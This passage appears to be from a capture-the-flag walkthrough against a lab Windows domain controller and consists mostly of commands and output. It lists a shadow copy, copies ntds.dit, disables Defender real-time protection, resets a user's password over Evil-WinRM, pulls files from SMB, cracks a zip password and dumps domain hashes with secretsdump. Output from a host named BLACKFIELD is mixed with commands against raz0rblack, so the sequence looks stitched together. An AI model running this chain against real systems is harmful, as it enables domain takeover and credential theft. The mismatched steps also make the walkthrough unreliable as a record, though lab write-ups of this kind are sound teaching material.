                - Shadow copy set: {a195cdc9-b679-45d5-b5f3-18a26100b167}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 12/19/2025 6:59:09 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %zs1n% z:
-> %zs1n% = {958cced4-1f97-425c-9ed7-617debec4b8d}
The  drive letter is already in use.

```

```powershell
*Evil-WinRM* PS C:\programdata> robocopy /b z:\Windows\ntds . ntds.dit
```

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

```bash
*Evil-WinRM* PS C:\programdata> net user sbradley Password123
The command completed successfully.
```


```bash
zs1n@ptw ~> impacket-smbclient raz0rblack.thm/sbradley:Password123@HAVEN-DC.raz0rblack.thm -dc-ip 10.65.181.222
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
trash
# use trash
# ls
drw-rw-rw-          0  Tue Mar 16 02:01:28 2021 .
drw-rw-rw-          0  Tue Mar 16 02:01:28 2021 ..
-rw-rw-rw-       1340  Thu Feb 25 14:29:05 2021 chat_log_20210222143423.txt
-rw-rw-rw-   18927164  Tue Mar 16 02:02:20 2021 experiment_gone_wrong.zip
-rw-rw-rw-         37  Sat Feb 27 14:24:21 2021 sbradley.txt
# get chat_log_20210222143423.txt
# get experiment_gone_wrong.zip
```

```bash
zs1n@ptw ~> 7z x experiment_gone_wrong.zip

7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 18927164 bytes (19 MiB)

Extracting archive: experiment_gone_wrong.zip
--
Path = experiment_gone_wrong.zip
Type = zip
Physical Size = 18927164


Enter password (will not be echoed):
```

```bash
zs1n@ptw ~> zip2john experiment_gone_wrong.zip > hash_zip
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 ts=591C cs=591c type=8
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 ts=5873 cs=5873 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

zs1n@ptw ~> j hash_zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
electromagnetismo (experiment_gone_wrong.zip)
1g 0:00:00:01 DONE (2026-03-25 14:55) 0.6493g/s 5441Kp/s 5441Kc/s 5441KC/s elfo2009..elboty2009
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
zs1n@ptw ~> RazorBlack impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL | tee hashes.txt
```